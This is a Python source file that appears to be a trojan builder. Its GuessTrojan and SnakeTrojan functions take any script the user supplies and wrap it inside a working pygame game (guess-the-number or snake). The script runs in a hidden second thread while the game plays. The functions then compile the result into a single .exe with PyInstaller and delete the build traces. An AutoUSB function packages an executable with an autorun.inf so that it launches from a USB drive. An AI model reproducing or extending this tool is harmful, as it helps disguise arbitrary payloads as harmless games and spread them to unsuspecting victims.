import subprocess
import os
import shutil

class PC:
    class Trojan:
        class Game:
            def GuessTrojan(File):
                try:
                    with open(File, 'r') as file:
                        script_content = file.read()
                        indented_script_content = '\n'.join(['    ' + line for line in script_content.split('\n')])
                except FileNotFoundError:
                    print(f"The file '{File}' does not exist.")
                except Exception as e:
                    print(f"An error occurred: {e}")
                file = open('GuessTrojan.py', 'w')
                file.write(f"""
import threading
import pygame
import random
import sys
def ExtraScript():
{indented_script_content}
    
def GuessTrojan():
   
    # Initialize Pygame
    pygame.init()
    
    # Set up game variables
    def reset_game():
        global target_number, attempts, result_text, input_text
        target_number = random.randint(1, 100)
        attempts = 0
        result_text = ""
        input_text = ""
    
    reset_game()
    
    # Set up screen
    screen_width, screen_height = 400, 300
    screen = pygame.display.set_mode((screen_width, screen_height))
    pygame.display.set_caption("Guess the Number")
    
    # Set up colors
    black = (0, 0, 0)
    white = (255, 255, 255)
    font = pygame.font.Font(None, 36)
    small_font = pygame.font.Font(None, 24)
    
    # Set up input variables
    input_rect = pygame.Rect(10, 50, 200, 30)
    input_active = False
    
    # Set up button variables
    button_rect = pygame.Rect(250, 50, 120, 40)
    
    # Main game loop
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.MOUSEBUTTONDOWN:
                if input_rect.collidepoint(event.pos):
                    input_active = not input_active
                elif button_rect.collidepoint(event.pos):
                    reset_game()
            elif event.type == pygame.KEYDOWN:
                if input_active:
                    if event.key == pygame.K_RETURN:
                        if input_text.isdigit():
                            guess = int(input_text)
                            attempts += 1
    
                            if guess == target_number:
                                result_text = "Congratulations! You guessed the number {{}} in {{}} attempts.".format(target_number,
                                                                                                                    attempts)
                            elif attempts >= 7:
                                result_text = "Game Over! You ran out of attempts. The number was {{}}".format(target_number)
                            else:
                                result_text = "Attempt {{}}: {{}}".format(attempts, "Too high!" if guess > target_number else "Too low!")
                        input_text = ""
                    elif event.key == pygame.K_BACKSPACE:
                        input_text = input_text[:-1]
                    else:
                        input_text += event.unicode
    
        # Clear the screen
        screen.fill(black)
    
        # Display result text
        result_text_surface = font.render(result_text, True, white)
        screen.blit(result_text_surface, (10, 10))
    
        # Display attempts text
        attempts_text_surface = small_font.render("Attempts: {{}}".format(attempts), True, white)
        screen.blit(attempts_text_surface, (10, 250))
    
        # Draw input field
        pygame.draw.rect(screen, white, input_rect, 2)
        input_surface = font.render(input_text, True, white)
        width = max(200, input_surface.get_width()+10)
        input_rect.w = width
        screen.blit(input_surface, (input_rect.x+5, input_rect.y+5))
    
        # Draw restart button
        pygame.draw.rect(screen, (0, 200, 0), button_rect)
        button_text_surface = font.render("Restart", True, white)
        screen.blit(button_text_surface, (button_rect.x + 10, button_rect.y + 10))
    
        # Update the display
        pygame.display.flip()
    
    # Quit Pygame
    pygame.quit()

    
mainThread = threading.Thread(target=GuessTrojan)
mainThread.start()
extraThread = threading.Thread(target=ExtraScript)
extraThread.start()
                """)
                file.close()
                subprocess.run(f'pyinstaller --onefile GuessTrojan.py')

                fileNAME, extenion = os.path.splitext("./GuessTrojan.py")

                try:
                    file_list = os.listdir(f'./build/{fileNAME}')
                    for file_name in file_list:
                        file_path = os.path.join(f'./build/{fileNAME}', file_name)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                except Exception as e:
                    print(f"An error occurred: {e}")

                try:
                    file_list = os.listdir(f'./build/{fileNAME}/localpycs')
                    for file_name in file_list:
                        file_path = os.path.join(f'./build/{fileNAME}/localpycs', file_name)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                except Exception as e:
                    print(f"An error occurred: {e}")

                try:
                    if os.path.exists(f'./dist/{fileNAME}.exe'):
                        shutil.move(f'./dist/{fileNAME}.exe', './')
                    else:
                        print("Source file does not exist.")
                except Exception as e:
                    print(f"Error: {e}")

                os.rmdir(f'./build/GuessTrojan/localpycs')
                os.rmdir(f'./build/GuessTrojan')
                os.rmdir('./build')
                os.rmdir('./dist')        

                os.remove(f'./{fileNAME}.spec')
                os.remove(f'./GuessTrojan.py')
                            
            def SnakeTrojan(File):
                try:
                    with open(File, 'r') as file:
                        script_content = file.read()
                        indented_script_content = '\n'.join(['    ' + line for line in script_content.split('\n')])
                except FileNotFoundError:
                    print(f"The file '{File}' does not exist.")
                except Exception as e:
                    print(f"An error occurred: {e}")
                file = open('Snake.py', 'w')
                file.write(f"""
import threading
import pygame
import random
def ExtraScript():
{indented_script_content}
def Snake():
    pygame.init()
    
    # Set up the display
    width, height = 800, 600
    display = pygame.display.set_mode((width, height))
    pygame.display.set_caption("Snake Game")
    
    # Define colors
    white = (255, 255, 255)
    black = (0, 0, 0)
    red = (255, 0, 0)
    green = (0, 255, 0)
    blue = (0, 0, 255)
    
    # Set up the snake
    snake_block = 10
    snake_speed = 15
    snake = [(width / 2, height / 2)]
    snake_direction = "RIGHT"
    
    # Set up the food
    food_size = 10
    food_position = [random.randrange(1, (width // 10)) * 10,
                    random.randrange(1, (height // 10)) * 10]
    
    # Function to draw the snake
    def draw_snake(snake):
        for block in snake:
            pygame.draw.rect(display, green, [block[0], block[1], snake_block, snake_block])
    
    # Function to draw the food
    def draw_food(food_position):
        pygame.draw.rect(display, red, [food_position[0], food_position[1], food_size, food_size])
    
    # Function to display the score
    def your_score(score):
        font = pygame.font.SysFont(None, 35)
        text = font.render("Your Score: " + str(score), True, white)
        display.blit(text, (10, 10))
    
    # Function to display the game over screen
    def game_over_screen():
        font = pygame.font.SysFont(None, 70)
        text = font.render("Game Over", True, white)
        display.blit(text, (width // 4, height // 3))
    
        font = pygame.font.SysFont(None, 35)
        restart_text = font.render("Press R to Restart", True, white)
        display.blit(restart_text, (width // 4 + 30, height // 2))
    
        pygame.display.update()
    
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_r:
                        return
    
    # Main game loop
    while True:
        game_over = False
    
        # Reset the snake and food
        snake = [(width / 2, height / 2)]
        snake_direction = "RIGHT"
        food_position = [random.randrange(1, (width // 10)) * 10,
                        random.randrange(1, (height // 10)) * 10]
    
        # Main game loop
        while not game_over:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT or event.key == pygame.K_a and not snake_direction == "RIGHT":
                        snake_direction = "LEFT"
                    elif event.key == pygame.K_RIGHT or event.key == pygame.K_d and not snake_direction == "LEFT":
                        snake_direction = "RIGHT"
                    elif event.key == pygame.K_UP or event.key == pygame.K_w and not snake_direction == "DOWN":
                        snake_direction = "UP"
                    elif event.key == pygame.K_DOWN or event.key == pygame.K_s and not snake_direction == "UP":
                        snake_direction = "DOWN"
    
            # Move the snake
            if snake_direction == "UP":
                snake.insert(0, (snake[0][0], snake[0][1] - snake_block))
            elif snake_direction == "DOWN":
                snake.insert(0, (snake[0][0], snake[0][1] + snake_block))
            elif snake_direction == "LEFT":
                snake.insert(0, (snake[0][0] - snake_block, snake[0][1]))
            elif snake_direction == "RIGHT":
                snake.insert(0, (snake[0][0] + snake_block, snake[0][1]))
    
            # Check for collisions with walls
            if snake[0][0] >= width or snake[0][0] < 0 or snake[0][1] >= height or snake[0][1] < 0:
                game_over = True
    
            # Check for collision with itself
            for segment in snake[1:]:
                if snake[0] == segment:
                    game_over = True
    
            # Check for collision with food
            if snake[0][0] == food_position[0] and snake[0][1] == food_position[1]:
                food_position = [random.randrange(1, (width // 10)) * 10,
                                random.randrange(1, (height // 10)) * 10]
            else:
                snake.pop()
    
            # Clear the screen
            display.fill(black)
    
            # Draw the snake and food
            draw_snake(snake)
            draw_food(food_position)
            your_score(len(snake) - 1)
    
            # Update the display
            pygame.display.update()
    
            # Set the game speed
            pygame.time.Clock().tick(snake_speed)
    
        # Display game over screen
        game_over_screen()
mainThread = threading.Thread(target=Snake)
mainThread.start()
extraThread = threading.Thread(target=ExtraScript)
extraThread.start()
                """)
                file.close()
                subprocess.run(f'pyinstaller --onefile Snake.py')

                fileNAME, extenion = os.path.splitext("./Snake.py")

                try:
                    file_list = os.listdir(f'./build/{fileNAME}')
                    for file_name in file_list:
                        file_path = os.path.join(f'./build/{fileNAME}', file_name)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                except Exception as e:
                    print(f"An error occurred: {e}")

                try:
                    file_list = os.listdir(f'./build/{fileNAME}/localpycs')
                    for file_name in file_list:
                        file_path = os.path.join(f'./build/{fileNAME}/localpycs', file_name)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                except Exception as e:
                    print(f"An error occurred: {e}")

                try:
                    if os.path.exists(f'./dist/{fileNAME}.exe'):
                        shutil.move(f'./dist/{fileNAME}.exe', './')
                    else:
                        print("Source file does not exist.")
                except Exception as e:
                    print(f"Error: {e}")

                os.rmdir(f'./build/Snake/localpycs')
                os.rmdir(f'./build/Snake')
                os.rmdir('./build')
                os.rmdir('./dist')        

                os.remove(f'./{fileNAME}.spec')
                os.remove(f'./Snake.py')
   
    class NormalBuilds:           
        def EXE(scriptPATH, Name):
            subprocess.run(f'pyinstaller --onefile {scriptPATH}')

            fileNAME, extenion = os.path.splitext(scriptPATH)

            try:
                file_list = os.listdir(f'./build/{fileNAME}')
                for file_name in file_list:
                    file_path = os.path.join(f'./build/{fileNAME}', file_name)
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception as e:
                print(f"An error occurred: {e}")

            try:
                file_list = os.listdir(f'./build/{fileNAME}/localpycs')
                for file_name in file_list:
                    file_path = os.path.join(f'./build/{fileNAME}/localpycs', file_name)
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception as e:
                print(f"An error occurred: {e}")

            try:
                if os.path.exists(f'./dist/{fileNAME}.exe'):
                    shutil.move(f'./dist/{fileNAME}.exe', './')
                else:
                    print("Source file does not exist.")
            except Exception as e:
                print(f"Error: {e}")

            os.rmdir(f'./build/{fileNAME}/localpycs')
            os.rmdir(f'./build/{fileNAME}')
            os.rmdir('./build')
            os.rmdir('./dist')        

            os.remove(f'./{fileNAME}.spec')

            os.rename(f"{fileNAME}.exe",f"./{Name}.exe")

        def AutoUSB(scriptPATH, Name):
            subprocess.run(f'pyinstaller --onefile {scriptPATH}')

            fileNAME, extenion = os.path.splitext(scriptPATH)

            try:
                file_list = os.listdir(f'./build/{fileNAME}')
                for file_name in file_list:
                    file_path = os.path.join(f'./build/{fileNAME}', file_name)
                    if os.path.isfile(file_path):
                        os.remove(file_path)
            except Exception as e:
                print(f"An error occurred: {e}")

            try:
                file_list = os.listdir(f'./build/{fileNAME}/localpycs')
                for file_name in file_list:
                    file_path = os.path.join(f'./build/{fileNAME}/localpycs', file_name)
                    if os.path.isfile(file_path):
                        os.remove(file_path)
            except Exception as e:
                print(f"An error occurred: {e}")

            try:
                if os.path.exists(f'./dist/{fileNAME}.exe'):
                    shutil.move(f'./dist/{fileNAME}.exe', './')
                else:
                    print("Source file does not exist.")
            except Exception as e:
                print(f"Error: {e}")

            os.rmdir(f'./build/{fileNAME}/localpycs')
            os.rmdir(f'./build/{fileNAME}')
            os.rmdir('./build')
            os.rmdir('./dist')        

            os.remove(f'./{fileNAME}.spec')

            os.rename(f"{fileNAME}.exe",f"./{Name}.exe")

            os.mkdir("./AutoRunUSB")
            file = open('autorun.inf', 'w')
            file.write( f"""

                       [Autorun]
                        Open={Name}.exe

                       """)
            file.close()

            shutil.move("./autorun.inf", "./AutoRunUSB/autorun.inf")
            shutil.move(f"./{Name}.exe",f"./AutoRunUSB/{Name}.exe")